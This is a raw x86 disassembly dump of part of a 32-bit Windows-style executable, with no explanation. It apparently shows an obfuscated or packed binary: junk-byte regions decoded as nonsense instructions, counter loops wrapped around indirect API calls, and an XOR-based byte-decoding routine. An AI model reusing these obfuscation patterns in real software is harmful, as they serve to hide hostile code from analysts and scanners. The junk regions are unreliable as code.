  40328b:	dec    ebp
  40328c:	jecxz  0x4032fb
  40328e:	popf   
  40328f:	jp     0x40324f
  403291:	sahf   
  403292:	js     0x4032bc
  403294:	adc    BYTE PTR [ebp+0x5c],dl
  403297:	ja     0x40329f
  403299:	add    edi,DWORD PTR [esp+edi*2+0x53]
  40329d:	jl     0x40331b
  40329f:	jl     0x4032c4
  4032a1:	inc    DWORD PTR [edx]
  4032a3:	cwde   
  4032a4:	jns    0x4032e2
  4032a6:	outs   dx,DWORD PTR ds:[esi]
  4032a7:	call   0x674c:0x41b35f15
  4032ae:	jge    0x403285
  4032b0:	adc    bh,dh
  4032b2:	add    dh,BYTE PTR [ebx+edx*1]
  4032b5:	jecxz  0x4032cd
  4032b7:	mov    BYTE PTR [ecx+edi*1],dl
  4032ba:	mov    dh,0xae
  4032bc:	add    edx,DWORD PTR [esi]
  4032be:	out    dx,al
  4032bf:	call   0xcb081cf2
  4032c4:	ss push eax
  4032c6:	cmp    dh,BYTE PTR [ebx]
  4032c8:	in     al,dx
  4032c9:	adc    ebx,DWORD PTR [edi+0x6faece36]
  4032cf:	cli    
  4032d0:	imul   ecx,DWORD PTR [ecx],0xffffff88
  4032d3:	inc    ecx
  4032d4:	xchg   ebx,eax
  4032d5:	sbb    edx,esi
  4032d7:	push   es
  4032d8:	add    eax,0xec0a3149
  4032dd:	sub    BYTE PTR [eax+0x10],ch
  4032e0:	scas   al,BYTE PTR es:[edi]
  4032e1:	gs push eax
  4032e3:	xchg   edx,eax
  4032e4:	cmp    DWORD PTR [edi],eax
  4032e6:	sbb    bl,BYTE PTR [edx+0x55]
  4032e9:	jae    0x403292
  4032eb:	mov    ebp,0x27735311
  4032f0:	or     al,ah
  4032f2:	in     eax,0x23
  4032f4:	mov    ah,0x26
  4032f6:	rol    BYTE PTR [ecx-0x7c],1
  4032f9:	ins    BYTE PTR es:[edi],dx
  4032fa:	fst    DWORD PTR [edx]
  4032fc:	fdivr  st(1),st
  4032fe:	dec    esi
  4032ff:	push   es
  403300:	in     al,dx
  403301:	add    dl,BYTE PTR ds:0x7dbebb67
  403307:	stos   BYTE PTR es:[edi],al
  403308:	dec    ebp
  403309:	frstor [esi+edi*2-0x43]
  40330d:	(bad)  
  40330e:	mov    esp,0xc0832656
  403313:	mov    dh,0xbb
  403315:	dec    edx
  403316:	mov    edx,0x95ed90b2
  40331b:	int3   
  40331c:	fistp  DWORD PTR [edi+0x79]
  40331f:	sub    al,0xa3
  403321:	test   BYTE PTR [esp+ecx*4-0x46fb50fb],ah
  403328:	enter  0xad8,0x6b
  40332c:	dec    eax
  40332d:	xor    ah,bh
  40332f:	jbe    0x40339b
  403331:	mov    eax,es:0x6cead5e9
  403337:	cdq    
  403338:	lahf   
  403339:	bound  edi,QWORD PTR [eax+0x56e94c4f]
  40333f:	jecxz  0x4033b7
  403341:	pop    ds
  403342:	leave  
  403343:	mov    bh,0x3b
  403345:	jb     0x403363
  403347:	or     dh,BYTE PTR [esi-0x57772e7a]
  40334d:	xchg   edx,eax
  40334e:	and    DWORD PTR [edi+0x7a],eax
  403351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403352:	dec    esi
  403353:	(bad)  
  403354:	dec    esi
  403355:	mov    al,0xd8
  403357:	(bad)  
  40335a:	nop
  40335b:	jmp    FWORD PTR [ecx-0x6b]
  40335e:	and    al,0x13
  403360:	and    DWORD PTR [edi],esi
  403362:	leave  
  403363:	(bad)  
  403364:	push   cs
  403365:	adc    DWORD PTR cs:[esi+0x40],ecx
  403369:	stos   DWORD PTR es:[edi],eax
  40336a:	dec    edx
  40336b:	ja     0x4033d5
  40336d:	sbb    edi,DWORD PTR [eax-0xd]
  403370:	or     eax,0xdc06ab0f
  403375:	icebp  
  403376:	jbe    0x4033cf
  403378:	dec    ebx
  403379:	scas   eax,DWORD PTR es:[edi]
  40337a:	inc    ecx
  40337b:	inc    DWORD PTR [ebx+0x59]
  40337e:	inc    ebx
  40337f:	dec    edx
  403380:	add    al,0xf8
  403382:	push   edi
  403383:	cs mov edx,0xd73bd603
  403389:	mov    DWORD PTR ds:0x4292b5,0x6344
  403393:	ja     0x4034eb
  403399:	push   ebx
  40339a:	jmp    0x4033a4
  40339f:	mov    esi,0x32729e
  4033a4:	mov    eax,DWORD PTR [ebp-0x8]
  4033a7:	mov    edi,DWORD PTR [ebp-0x4]
  4033aa:	xor    edi,ecx
  4033ac:	add    edi,esi
  4033ae:	mov    esi,DWORD PTR [ebp+0x8]
  4033b1:	imul   edi,edx
  4033b4:	mov    ebx,DWORD PTR [ebp+0xc]
  4033b7:	xor    eax,ecx
  4033b9:	add    eax,edx
  4033bb:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  4033c2:	mov    BYTE PTR [edi+esi*1],al
  4033c5:	mov    eax,DWORD PTR [ebp-0x4]
  4033c8:	xor    eax,ecx
  4033ca:	lea    edx,[edx+eax*1+0x32729e]
  4033d1:	mov    eax,DWORD PTR [ebp-0x4]
  4033d4:	jmp    0x4034d6
  4033d9:	jnp    0x4033fa
  4033db:	dec    BYTE PTR [eax-0x108252a6]
  4033e1:	pop    esi
  4033e2:	mov    DWORD PTR [edx],ebp
  4033e4:	pop    ebp
  4033e5:	mov    ecx,0x7daf8d90
  4033ea:	add    edi,DWORD PTR [esp+edi*2+0x53]
  4033ee:	jl     0x40346c
  4033f0:	jl     0x4033a9
  4033f2:	add    ah,BYTE PTR [edi-0x3d]
  4033f5:	mov    cl,0x52
  4033f7:	je     0x40344f
  4033f9:	xchg   ebp,ebp
  4033fb:	sub    cl,cl
  4033fd:	lahf   
  4033fe:	call   0xc250:0x1823929c
  403405:	push   0xffffffad
  403407:	inc    ebp
  403408:	daa    
  403409:	inc    eax
  40340a:	push   ecx
  40340b:	(bad)  
  40340c:	push   esp
  40340d:	adc    al,0x8
  40340f:	ins    DWORD PTR es:[edi],dx
  403410:	xor    cl,BYTE PTR [eax+0x7b]
  403413:	add    al,0x3c
  403415:	dec    edx
  403416:	xor    BYTE PTR [esi+ebx*4],dh
  403419:	fwait
  40341a:	dec    esi
  40341b:	aad    0xdf
  40341d:	lods   eax,DWORD PTR ds:[esi]
  40341e:	lds    ebp,FWORD PTR [ebp-0x50]
  403421:	js     0x4033cd
  403423:	mov    ecx,0xb3576aa6
  403428:	xor    eax,0xf69dad8d
  40342d:	jne    0x4034ab
  40342f:	ds xor al,0x26
  403432:	ficom  WORD PTR [ecx+0x38]
  403435:	jge    0x4034a2
  403437:	xchg   dh,cl
  403439:	repnz mov eax,0xfed9a1a5
  40343f:	repnz mov cl,BYTE PTR [edx-0x56]
  403443:	sti    
  403444:	dec    eax
  403445:	dec    edi
  403446:	jne    0x40342f
  403448:	mov    cs,WORD PTR [esp+esi*4]
  40344b:	sbb    BYTE PTR [eax+0x23],bl
  40344e:	mov    edx,0xd8cd4478
  403453:	and    eax,0xa977c19e
  403458:	dec    esi
  403459:	ins    BYTE PTR es:[edi],dx
  40345a:	add    DWORD PTR [esp+edx*1+0x3a],edi
  40345e:	popf   
  40345f:	sbb    bh,BYTE PTR [esi-0x24687af2]
  403465:	test   edi,ebp
  403467:	push   esp
  403468:	inc    BYTE PTR [eax]
  40346a:	fisubr DWORD PTR [esi]
  40346c:	inc    esp
  40346d:	push   esi
  40346e:	lahf   
  40346f:	sbb    al,0x76
  403471:	push   cs
  403472:	ins    DWORD PTR es:[edi],dx
  403473:	sahf   
  403474:	in     al,dx
  403475:	sub    BYTE PTR [ecx-0x11cd39a9],dl
  40347b:	cli    
  40347c:	retf   
  40347d:	clc    
  40347e:	div    bh
  403480:	(bad)
  403483:	mov    ebx,DWORD PTR [ebx-0x1341a345]
  403489:	mov    ebx,0xbb0b9ea6
  40348e:	rcr    DWORD PTR [ebp-0x3],1
  403491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403492:	xor    eax,0xcd353568
  403497:	arpl   WORD PTR [esp+ebx*8-0x680b23b3],ax
  40349e:	add    al,0xec
  4034a0:	cmc    
  4034a1:	pop    esi
  4034a2:	(bad)  
  4034a3:	call   0x4508bbb3
  4034a8:	add    edx,DWORD PTR [edx+0x3f]
  4034ab:	mov    ecx,ecx
  4034ad:	pop    edx
  4034ae:	xchg   edx,eax
  4034af:	mov    WORD PTR [esi-0x6a],ss
  4034b2:	jbe    0x403504
  4034b4:	retf   0xceef
  4034b7:	jo     0x4034a5
  4034b9:	mov    WORD PTR [edi+0x78a90225],ds
  4034bf:	test   eax,0x4faf242b
  4034c4:	shl    DWORD PTR [eax-0x24bc20db],1
  4034ca:	call   0x47dfbe38
  4034cf:	loop   0x403503
  4034d1:	push   ebp
  4034d2:	and    ebx,DWORD PTR [esi]
  4034d4:	and    DWORD PTR [ecx],ebp
  4034d6:	xor    eax,ecx
  4034d8:	mov    esi,0xffcd8d62
  4034dd:	sub    esi,eax
  4034df:	add    esi,DWORD PTR [ebp+0x10]
  4034e2:	cmp    edx,esi
  4034e4:	jbe    0x40339f
  4034ea:	pop    ebx
  4034eb:	mov    eax,0xf89c8534
  4034f0:	pop    edi
  4034f1:	pop    esi
  4034f2:	leave  
  4034f3:	ret    0xc
  4034f6:	push   ebp
  4034f7:	mov    ebp,esp
  4034f9:	mov    eax,ds:0x409224
  4034fe:	movzx  ecx,BYTE PTR ds:0x4292c1
  403505:	add    DWORD PTR ds:0x4275ac,ecx
  40350b:	mov    edx,0x32729e
  403510:	mov    DWORD PTR ds:0x4292d9,0x1e
  40351a:	cmp    DWORD PTR ds:0x4292d9,0x0
  403521:	je     0x4035b5
  403527:	cmp    DWORD PTR ds:0x4292d9,0x27
  40352e:	jne    0x40353f
  403534:	push   0x1072
  403539:	call   DWORD PTR ds:0x427c43
  40353f:	mov    ecx,DWORD PTR ds:0x4292d9
  403545:	dec    ecx
  403546:	mov    DWORD PTR ds:0x4292d9,ecx
  40354c:	jmp    0x40351a
  403551:	and    DWORD PTR ds:0x4292c5,0x0
  40355b:	xor    ecx,ecx
  40355d:	or     ecx,DWORD PTR ds:0x4292c5
  403563:	inc    ecx
  403564:	mov    DWORD PTR ds:0x4292c5,ecx
  40356a:	cmp    DWORD PTR ds:0x4292c5,0xd
  403571:	jne    0x40358c
  403577:	push   0x42c892
  40357c:	push   0x4275ed
  403581:	push   0x400000
  403586:	call   DWORD PTR ds:0x427a93
  40358c:	cmp    DWORD PTR ds:0x4292c5,0xc
  403593:	jne    0x4035a8
  403599:	xor    ecx,ecx
  40359b:	or     ecx,DWORD PTR ds:0x4292c5
  4035a1:	inc    ecx
  4035a2:	mov    DWORD PTR ds:0x4292c5,ecx
  4035a8:	cmp    DWORD PTR ds:0x4292c5,0x17
  4035af:	jb     0x40355b
  4035b5:	sub    eax,edx
  4035b7:	mov    ecx,DWORD PTR ds:0x42c8ae
  4035bd:	mov    ecx,DWORD PTR [ecx]
  4035bf:	sbb    DWORD PTR ds:0x4275b0,ecx
  4035c5:	mov    ecx,0x7510857
  4035ca:	push   esi
  4035cb:	mov    esi,DWORD PTR [ebp+0xc]
  4035ce:	xor    eax,ecx
  4035d0:	cmp    eax,esi
  4035d2:	je     0x403916
  4035d8:	mov    eax,ds:0x40921c
  4035dd:	mov    esi,DWORD PTR [ebp+0xc]
  4035e0:	sub    eax,edx
  4035e2:	jmp    0x4036e1
  4035e7:	not    DWORD PTR [ebx-0x6c]
  4035ea:	adc    ch,BYTE PTR [eax-0x13]
  4035ed:	lea    ebp,[ebp+0x4f]
  4035f0:	xchg   edi,eax
  4035f1:	xchg   esp,eax
  4035f2:	cwde   
  4035f3:	sbb    al,0xfa
  4035f5:	das    
  4035f6:	inc    eax
  4035f7:	push   eax
  4035f8:	add    bh,BYTE PTR [esp+edi*2+0x5e]
  4035fc:	jl     0x40367a
  4035fe:	jl     0x4035fb
  403600:	sbb    al,0x3
  403602:	or     BYTE PTR [esp+esi*2-0xb67685f],cl
  403609:	test   eax,0x412ba998
  40360e:	les    esi,FWORD PTR [eax-0x435bd0e7]
  403614:	inc    DWORD PTR [esi+0x5222d2f6]
  40361a:	xor    DWORD PTR [edx+0x6deeffea],edx
  403620:	lods   eax,DWORD PTR ds:[esi]
  403621:	cli    
  403622:	fwait
  403623:	inc    eax
  403624:	mov    edx,edx
  403626:	fimul  WORD PTR [ebx-0x50]
  403629:	pop    edx
  40362a:	cmp    edi,DWORD PTR [esi+0x3ced5cb9]
  403630:	inc    edx
  403631:	(bad)
  403635:	ja     0x403650
  403637:	dec    edi
  403638:	or     dl,al
  40363a:	ja     0x4036b7
  40363c:	mov    ebp,ebp
  40363e:	sub    eax,0x52b0f712
  403643:	jbe    0x403609
  403645:	ins    DWORD PTR es:[edi],dx
  403646:	jge    0x403653
  403648:	mov    DWORD PTR [edi+ebp*8-0x80],edi
  40364c:	popa   
  40364d:	add    WORD PTR [ebx],ax
  403650:	popf   
  403651:	mov    ?,esi
  403653:	inc    edx
  403654:	and    eax,0x2f2babea
  403659:	cdq    
  40365a:	cmp    BYTE PTR [edx+0x67],dl
  40365d:	dec    edx
  40365e:	(bad)  
  40365f:	mov    ch,0x6c
  403661:	sub    DWORD PTR [edx],eax
  403663:	dec    edi
  403664:	push   esi
  403665:	sbb    al,0x79
  403667:	lds    ecx,FWORD PTR [eax+0x44957ed1]
  40366d:	aam    0x3
  40366f:	(bad)  
  403670:	fwait
  403671:	retf   
  403672:	(bad)  
  403674:	les    ebp,FWORD PTR [esi-0x3]
  403677:	jnp    0x4035fd
  403679:	xchg   edx,eax
  40367a:	pop    ss
  40367b:	push   0x8736c97c
  403680:	dec    ecx
  403681:	(bad)  [edi-0x7cf24b5]
  403687:	push   edi
  403688:	aad    0xb4
  40368a:	push   esp
  40368b:	mov    esi,0x465d324e
  403690:	call   0x1498:0x74b23eba
  403697:	pop    eax
  403698:	sub    BYTE PTR [edx],ah
  40369a:	add    DWORD PTR [eax+0x2a2d1c93],eax
  4036a0:	(bad)  
  4036a1:	mov    bl,0xf9
  4036a3:	call   0xd7993bc
  4036a8:	shr    DWORD PTR [ebp+0x7ae7203c],1
  4036ae:	and    BYTE PTR [edi-0x2b1c41a],bh
  4036b4:	xor    edx,DWORD PTR [esi+0x6b]
  4036b7:	int    0x27
  4036b9:	bound  ebx,QWORD PTR [ecx+0x72ff6ed7]
  4036bf:	sbb    eax,esp
  4036c1:	mov    bl,0xf5
  4036c3:	cdq    
  4036c4:	cmp    eax,0xefb1b925
  4036c9:	push   ebx
  4036ca:	push   esi
  4036cb:	jbe    0x40364f
  4036cd:	inc    ecx
  4036ce:	inc    ecx
  4036cf:	clc    
  4036d0:	xchg   esi,eax
  4036d1:	adc    eax,0xd59b9c5e
  4036d6:	cmp    ah,BYTE PTR [ecx-0x70]
  4036d9:	pop    edx
  4036da:	stos   BYTE PTR es:[edi],al
  4036db:	xor    eax,0xd5a39d60
  4036e0:	sub    DWORD PTR [ebx],esi
  4036e2:	sar    DWORD PTR [ebx],0xc6
  4036e5:	jne    0x4037fa
  4036eb:	mov    eax,ds:0x409224
  4036f0:	add    eax,DWORD PTR ds:0x40921c
  4036f6:	jmp    0x403900
  4036fb:	jmp    0x4037fa
  403700:	xchg   esi,eax
  403701:	xchg   ebx,eax
  403702:	pop    ecx
  403703:	test   BYTE PTR [ebp+0x7a],bl
  403706:	imul   esp,DWORD PTR [ebp-0x47e923f9],0xf03b7abd
  403710:	mov    dl,0x5
  403712:	jl     0x403790
  403714:	pop    esi
  403715:	jl     0x403793
  403717:	jl     0x4036e9
  403719:	push   edi
  40371a:	jns    0x40371b
  40371c:	push   ebp
  40371d:	mov    BYTE PTR cs:[ecx-0x80],bl
  403721:	stos   BYTE PTR es:[edi],al
  403722:	cs cli 
  403724:	push   ebp
  403725:	mov    ds:0xa4ac1b4f,eax
  40372a:	enter  0xdf0a,0xa5
  40372e:	test   esi,ebp
  403730:	mov    al,ds:0x2aef4de6
  403735:	add    eax,0x4f36abab
  40373a:	mov    eax,ds:0x1cf12efd
  40373f:	xlat   BYTE PTR ds:[ebx]
  403740:	mov    ch,0xc5
  403742:	jmp    0xd9fff68c
  403747:	add    BYTE PTR [ecx],dl
  403749:	mov    cl,0x79
  40374b:	cmp    ebx,DWORD PTR [esi]
  40374d:	rcl    BYTE PTR [ebx+0x2d],1
  403750:	add    ebx,DWORD PTR [ebp+0x36]
  403753:	xor    eax,0xf4b90ca8
  403758:	mov    eax,ds:0xa8b6a8e8
  40375d:	mov    ebx,0x56f4527e
  403762:	sbb    ah,BYTE PTR [ebp+0x3a4bf9ab]
  403768:	adc    BYTE PTR [esi-0x23],dh
  40376b:	sub    eax,0xcc54697c
  403770:	xor    eax,0x24f198c0
  403775:	jb     0x4037d1
  403777:	inc    ebx
  403778:	adc    eax,0x10cf10be
  40377d:	add    edi,DWORD PTR [esi]
  40377f:	xor    edx,ebp
  403781:	mov    eax,0xdafa8cfe
  403786:	mul    ebx
  403788:	daa    
  403789:	stc    
  40378a:	mov    ds:0x44201159,eax
  40378f:	pop    esp
  403790:	cmp    ebp,DWORD PTR ds:0x7c8fcb2a
  403796:	sub    DWORD PTR [ecx],esi
  403798:	xchg   esi,ebp
  40379a:	xchg   ecx,eax
  40379b:	dec    eax
  40379c:	pop    esp
  40379d:	pop    edx
  40379e:	fdivr  st,st(5)
  4037a0:	in     eax,dx
  4037a1:	jl     0x40374d
  4037a3:	inc    esp
  4037a4:	das    
  4037a5:	jl     0x403785
  4037a7:	add    al,0x21
  4037a9:	sub    edx,DWORD PTR [edx+0x4c]
  4037ac:	mov    ebp,0x5468d9c3
  4037b1:	lahf   
  4037b2:	jecxz  0x403765
  4037b4:	cmp    al,0x0
  4037b6:	aas    
  4037b7:	in     al,0xb1
  4037b9:	push   0x52
  4037bb:	hlt    
  4037bc:	mov    edi,0x9b8dfc4b
  4037c1:	test   BYTE PTR [ebx-0x65cb2c7c],al
  4037c7:	pop    es
  4037c8:	mov    eax,ds:0x15822217
  4037cd:	adc    eax,0x397365ae
  4037d2:	mov    esi,0x5ef02842
  4037d7:	mov    ds:0xa99e043c,al
  4037dc:	jne    0x40384e
  4037de:	mov    bl,0x6f
  4037e0:	mov    eax,0x45c17540
  4037e5:	pop    esp
  4037e6:	sbb    eax,0xa93af78a
  4037eb:	adc    esp,DWORD PTR [edx]
  4037ed:	dec    edi
  4037ee:	or     al,0x46
  4037f0:	imul   ecx,DWORD PTR ds:0xdfe7d0c9,0xffffffc4
  4037f7:	inc    eax
  4037f8:	test   BYTE PTR [ecx],dl
  4037fa:	mov    eax,DWORD PTR [ebp+0xc]
  4037fd:	jmp    0x4038fc
  403802:	add    al,0x38
  403804:	and    DWORD PTR [ebx-0x5b],0x27bfa7d
  40380b:	jg     0x40385f
  40380d:	and    BYTE PTR [edx+esi*1+0x494d3d2],dh
  403814:	jl     0x403892
  403816:	pop    esi
  403817:	jl     0x403895
  403819:	jl     0x4037bd
  40381b:	pushf  
  40381c:	stc    
  40381d:	addr16 and eax,0x5273aa86
  403823:	pop    edi
  403824:	test   DWORD PTR [edx-0x6a],esi
  403827:	mov    al,0x20
  403829:	pop    ebx
  40382a:	adc    DWORD PTR [eax-0x13],eax
  40382d:	stos   BYTE PTR es:[edi],al
  40382e:	mov    DWORD PTR [ecx+ebp*8+0x47dbef91],eax
  403835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403836:	adc    bl,dh
  403838:	test   bh,bl
  40383a:	pop    edi
  40383b:	lock inc edi
  40383d:	or     DWORD PTR [ecx],edi
  40383f:	call   0xdc79cd3b
  403844:	fst    st(6)
  403846:	mov    esi,0xd21af42c
  40384b:	std    
  40384c:	cwde   
  40384d:	jnp    0x403811
  40384f:	inc    edx
  403850:	test   BYTE PTR ds:0xc829b3f9,bl
  403856:	and    DWORD PTR [ebx-0x3774989b],eax
  40385c:	jae    0x403849
  40385e:	outs   dx,DWORD PTR ds:[esi]
  40385f:	mov    esp,0x94378254
  403864:	xor    eax,0xf5656c04
  403869:	sbb    ecx,DWORD PTR [edx+0x606baf2c]
  40386f:	pop    es
  403870:	mov    ecx,0xf95d118f
  403875:	dec    ebp
  403876:	push   cs
  403877:	dec    esi
  403878:	lods   eax,DWORD PTR ds:[esi]
  403879:	inc    ebx
  40387a:	pushf  
  40387b:	mov    edi,0xbfb5063b
  403880:	fwait
  403881:	cli    
  403882:	sub    al,0xfd
  403884:	and    al,0x89
  403886:	ja     0x4038e8
  403888:	push   ss
  403889:	mov    WORD PTR [edi],?
  40388b:	and    DWORD PTR [eax+eax*2],edi
  40388e:	xor    eax,0x5911c153
  403893:	xchg   edi,eax
  403894:	dec    ebp
  403895:	xchg   esp,eax
  403896:	cmc    
  403897:	imul   ebx,DWORD PTR [edx+0x2b],0x582485c8
  40389e:	sahf   
  40389f:	scas   eax,DWORD PTR es:[edi]
  4038a0:	sub    ebx,DWORD PTR [ecx-0x79]
  4038a3:	jne    0x403888
  4038a5:	test   BYTE PTR [ecx-0x3b],dh
  4038a8:	test   al,dh
  4038aa:	fs jae 0x4038cd
  4038ad:	jno    0x4038a7
  4038af:	sub    eax,0x29abfbb8
  4038b4:	or     DWORD PTR [edx],0x66f79775
  4038ba:	int    0x32
  4038bc:	ss mov dl,0x97
  4038bf:	and    al,BYTE PTR [edi+0x4a86af13]
  4038c5:	push   ecx
  4038c6:	push   ebp
  4038c7:	mov    ds,WORD PTR [ecx]
  4038c9:	repz jmp 0x1e39c9d0
  4038cf:	push   0x7
  4038d1:	push   esi
  4038d2:	xor    ecx,DWORD PTR [eax-0x767f2ab5]
  4038d8:	pushf  
  4038d9:	push   0xf67b5b1a
  4038de:	in     al,0x9e
  4038e0:	mov    esi,0x1721f0d1
  4038e5:	dec    ebx
  4038e6:	add    eax,0x2ad4eeff
  4038eb:	call   0x1a12e384
  4038f0:	shl    DWORD PTR [eax+0x4ba192f0],1
  4038f6:	retf   
  4038f7:	inc    eax
  4038f8:	mov    cl,0xf2
  4038fa:	push   0x3c133de
  4038ff:	ret    0x1ca3
  403902:	xchg   edx,eax
  403903:	inc    eax
  403904:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  40390a:	add    eax,edx
  40390c:	mov    ds:0x409224,eax
  403911:	jmp    0x403920
  403916:	mov    eax,ds:0x409224
  40391b:	mov    ds:0x40921c,eax
  403920:	mov    eax,DWORD PTR [ebp+0x8]
  403923:	mov    eax,DWORD PTR [eax]
  403925:	mov    ecx,DWORD PTR ds:0x40921c
  40392b:	add    DWORD PTR [eax],ecx
  40392d:	pop    esi
  40392e:	pop    ebp
  40392f:	ret    0x8
  403932:	push   ebp
  403933:	mov    ebp,esp
  403935:	sub    esp,0x58
  403938:	mov    DWORD PTR ds:0x42c89e,0x1c
  403942:	cmp    DWORD PTR ds:0x42c89e,0x0
  403949:	je     0x40397e
  40394f:	cmp    DWORD PTR ds:0x42c89e,0x22
  403956:	jne    0x40396b
  40395c:	push   DWORD PTR [ebp-0x14]
  40395f:	push   DWORD PTR [ebp-0x28]
  403962:	push   DWORD PTR [ebp-0x10]
  403965:	call   DWORD PTR ds:0x4278ef
  40396b:	xor    eax,eax
  40396d:	add    eax,DWORD PTR ds:0x42c89e
  403973:	dec    eax
  403974:	mov    ds:0x42c89e,eax
  403979:	jmp    0x403942
  40397e:	mov    ecx,DWORD PTR [ebp+0x8]
  403981:	mov    eax,0x8a42
  403986:	xor    ax,WORD PTR [ecx+0x20]
  40398a:	mov    ecx,0x3b08
  40398f:	add    ax,cx
  403992:	jmp    0x403a97
  403997:	sar    BYTE PTR [edi-0x226ae210],cl
  40399d:	jge    0x403a06
  40399f:	js     0x4039f2
  4039a1:	dec    edi
  4039a2:	mov    esi,0xa73580b7
  4039a7:	test   BYTE PTR [edi],0x7c
  4039aa:	jl     0x403a00
  4039ac:	jl     0x403a2a
  4039ae:	jl     0x4039be
  4039b0:	fidiv  WORD PTR [edx]
  4039b2:	cdq    
  4039b3:	xchg   esp,eax
  4039b4:	cmp    al,0xbc
  4039b6:	imul   ebp,DWORD PTR [edi+0x29db02c],0xa
  4039bd:	ds xchg edx,eax
  4039bf:	add    al,0xe
  4039c1:	test   eax,esp
  4039c3:	cdq    
  4039c4:	dec    esi
  4039c5:	scas   eax,DWORD PTR es:[edi]
  4039c6:	pop    ss
  4039c7:	add    cl,BYTE PTR [ebx+0x3b]
  4039ca:	ja     0x40396c
  4039cc:	cmc    
  4039cd:	sbb    bl,al
  4039cf:	dec    edi
  4039d0:	xor    al,0xee
  4039d2:	repz pop ebp
  4039d4:	leave  
  4039d5:	retf   
  4039d6:	add    esi,eax
  4039d8:	sbb    DWORD PTR [esp+edi*2],eax
  4039db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039dc:	inc    ebx
  4039dd:	repz sahf 
  4039df:	ficom  WORD PTR [ecx]
  4039e1:	sbb    ebx,DWORD PTR [edi]
  4039e3:	leave  
  4039e4:	jecxz  0x403a0b
  4039e6:	push   esi
  4039e7:	jo     0x40399d
  4039e9:	mov    cl,0xe5
  4039eb:	mov    al,ds:0x69c90b2f
  4039f0:	and    eax,0x105d9b8e
  4039f5:	leave  
  4039f6:	ror    edi,0xf7
  4039f9:	mov    ch,0x8a
  4039fb:	div    BYTE PTR ss:[ebx+0x75]
  4039ff:	push   cs
  403a00:	nop
  403a01:	push   ds
  403a02:	dec    edx
  403a03:	push   ds
  403a04:	(bad)  
  403a05:	ja     0x403a3e
  403a07:	sar    al,cl
  403a09:	ds retf 0xc322
  403a0d:	or     DWORD PTR es:[edi],esp
  403a10:	clc    
  403a11:	pushf  
  403a12:	mov    esi,0xc3d5f406
  403a17:	xchg   esi,eax
  403a18:	xchg   edx,eax
  403a19:	loopne 0x403a2b
  403a1b:	lds    ecx,FWORD PTR [ebx+ebx*4]
  403a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a1f:	push   ebx
  403a20:	push   es
  403a21:	nop
  403a22:	push   0xd199f088
  403a27:	inc    ecx
  403a28:	mov    WORD PTR [eax+0x24],es
  403a2b:	inc    eax
  403a2c:	pop    es
  403a2d:	test   BYTE PTR [eax+0x4],0xb0
  403a31:	repz sub al,0xbc
  403a34:	in     eax,dx
  403a35:	mov    ebp,0xb1c16e49
  403a3a:	mov    dl,0x80
  403a3c:	push   ds
  403a3d:	jecxz  0x4039e3
  403a3f:	enter  0xbdef,0x91
  403a43:	mov    al,0x5e
  403a45:	lahf   
  403a46:	loope  0x403a3a
  403a48:	push   ebp
  403a49:	adc    DWORD PTR [ebx+0x1f],ebp
  403a4c:	nop
  403a4d:	jecxz  0x403a0b
  403a4f:	pusha  
  403a50:	gs repz xchg ebp,eax
  403a53:	or     eax,0x76110fb7
  403a58:	jmp    0x403a2a
  403a5a:	das    
  403a5b:	cmp    BYTE PTR [ecx+0x75],dh
  403a5e:	test   BYTE PTR [edi-0x271f43ef],bl
  403a64:	jg     0x4039fe
  403a66:	call   0x9763ad25
  403a6b:	pop    ebp
  403a6c:	lea    esp,[ebx+edx*1]
  403a6f:	sbb    eax,esi
  403a71:	mov    al,ds:0x3d2a79b
  403a76:	ins    BYTE PTR es:[edi],dx
  403a77:	add    DWORD PTR [esi],edi
  403a79:	inc    esi
  403a7a:	push   ecx
  403a7b:	adc    DWORD PTR [edx],0x6fb6d0d6
  403a81:	ins    DWORD PTR es:[edi],dx
  403a82:	out    dx,eax
  403a83:	retf   0x9cad
  403a86:	test   cl,ah
  403a88:	add    DWORD PTR [ebx+0x5373128e],ebx
  403a8e:	dec    ebp
  403a8f:	sahf   
  403a90:	xor    BYTE PTR [eax+0x459b0d14],cl
  403a96:	jg     0x403aa7
  403a98:	mov    bh,0xc0
  403a9a:	xor    ecx,ecx
  403a9c:	xor    ecx,DWORD PTR ds:0x427db0
  403aa2:	mov    ecx,DWORD PTR [ecx]
  403aa4:	or     DWORD PTR ds:0x42c88a,ecx
  403aaa:	mov    DWORD PTR [ebp-0xc],eax
  403aad:	adc    DWORD PTR ds:0x42c882,ecx
  403ab3:	mov    BYTE PTR [ebp-0x1],0x7f
  403ab7:	not    ecx
  403ab9:	lea    eax,[ebp-0x1]
  403abc:	xor    DWORD PTR ds:0x42c88a,0x4292b9
  403ac6:	mov    DWORD PTR [ebp-0x10],eax
  403ac9:	mov    DWORD PTR ds:0x427d0f,0x12
  403ad3:	cmp    DWORD PTR ds:0x427d0f,0x0
  403ada:	je     0x403b2a
  403ae0:	cmp    DWORD PTR ds:0x427d0f,0x8
  403ae7:	jne    0x403af6
  403aed:	push   DWORD PTR [ebp-0xc]
  403af0:	call   DWORD PTR ds:0x4279cf
  403af6:	cmp    DWORD PTR ds:0x427d0f,0x9
  403afd:	jne    0x403b12
  403b03:	xor    ecx,ecx
  403b05:	xor    ecx,DWORD PTR ds:0x427d0f
  403b0b:	dec    ecx
  403b0c:	mov    DWORD PTR ds:0x427d0f,ecx
  403b12:	mov    ecx,DWORD PTR ds:0x427d0f
  403b18:	dec    ecx
  403b19:	mov    DWORD PTR ds:0x427d0f,ecx
  403b1f:	jmp    0x403ad3
  403b24:	sbb    DWORD PTR ds:0x4292bd,edi
  403b2a:	mov    al,BYTE PTR [ebp-0x1]
  403b2d:	xor    DWORD PTR ds:0x4292b9,0x35da
  403b37:	mov    ecx,DWORD PTR [ebp-0x10]
  403b3a:	xor    DWORD PTR ds:0x4292bd,0x513b
  403b44:	xor    al,0x49
  403b46:	xor    DWORD PTR ds:0x42c89a,0x3273
  403b50:	sub    al,0x35
  403b52:	add    DWORD PTR ds:0x4292a5,0x42759c
  403b5c:	mov    BYTE PTR [ecx],al
  403b5e:	xor    DWORD PTR ds:0x427d17,0x427d07
  403b68:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  403b6f:	jmp    0x403c74
  403b74:	(bad)  
